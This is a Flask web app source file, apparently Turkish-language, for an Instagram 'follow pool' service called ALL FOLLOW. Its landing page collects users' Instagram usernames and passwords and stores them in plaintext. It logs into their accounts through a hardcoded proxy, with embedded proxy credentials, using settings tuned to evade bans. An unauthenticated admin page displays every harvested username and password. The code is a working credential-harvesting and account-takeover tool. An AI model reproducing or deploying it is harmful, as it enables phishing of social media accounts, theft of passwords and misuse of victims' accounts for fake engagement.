import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///allfollow.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
        <div style="background:#1e293b;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #334155;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);">
            <h1 style="font-style:italic;letter-spacing:-2px;font-size:36px;margin-bottom:5px;background:linear-gradient(to right, #3b82f6, #22d3ee);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">ALL FOLLOW</h1>
            <p style="font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">Interaction Pool v2.0</p>
            <input id="u" placeholder="Kullanıcı Adı" style="width:100%;padding:14px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:12px;outline:none;">
            <input id="p" type="password" placeholder="Şifre" style="width:100%;padding:14px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:12px;outline:none;">
            <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;transition:0.3s;">BAĞLAN VE KAZAN</button>
            <p id="m" style="font-size:13px;margin-top:20px;color:#94a3b8;line-height:1.5;"></p>
        </div>
        <script>
            async function login(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const b=document.getElementById('b'), m=document.getElementById('m');
                if(!u || !p) return;
                b.disabled=true; b.innerText="BAĞLANILIYOR..."; m.innerText="Instagram ile güvenli tünel kuruluyor...";
                try {
                    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                    const d=await r.json();
                    m.innerText=d.msg; b.disabled=false; b.innerText="TEKRAR DENE";
                    if(d.status==="success") { b.innerText="BAĞLANDI ✅"; b.style.background="#10b981"; }
                } catch(e) { m.innerText="Sunucu bağlantısı koptu."; b.disabled=false; }
            }
        </script>
    </body>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    cl = Client()
    try:
        cl.set_proxy(PROXY_URL)
        cl.request_timeout = 25
        
        # Giriş yaparken cihazı rastgele seçme, sabit tut (Ban riskini azaltır)
        cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR", "timezone_offset": 10800})
        
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Havuza başarıyla katıldınız! Coin kasmaya başladınız.")
        
    except ChallengeRequired:
        user.status = "DOĞRULAMA (KOD) GEREKLİ ⚠️"
        db.session.commit()
        return jsonify(status="error", msg="Instagram doğrulama kodu istedi. Lütfen uygulamaya girip 'Benim' butonuna basın.")
    except BadPassword:
        user.status = "HATALI ŞİFRE ❌"
        db.session.commit()
        return jsonify(status="error", msg="Kullanıcı adı veya şifre yanlış.")
    except Exception as e:
        err_msg = str(e)
        user.status = f"Hata: {err_msg[:40]}"
        db.session.commit()
        # Eğer hala "send you an e..." diyorsa buraya düşer
        if "send you an e" in err_msg.lower():
            return jsonify(status="error", msg="Instagram güvenliği için uygulamadan girişinizi onaylayın (Check-in).")
        return jsonify(status="error", msg="Bağlantı meşgul, 15sn sonra tekrar deneyin.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"<body style='background:#0f172a;color:#fff;padding:20px;font-family:sans-serif;'>"
    res += f"<h2>ALL FOLLOW HAVUZU ({len(users)} Hesap)</h2>"
    res += "<table border='1' style='width:100%; border-collapse:collapse;'>"
    res += "<tr style='background:#1e293b'><th>Username</th><th>Password</th><th>Status</th></tr>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
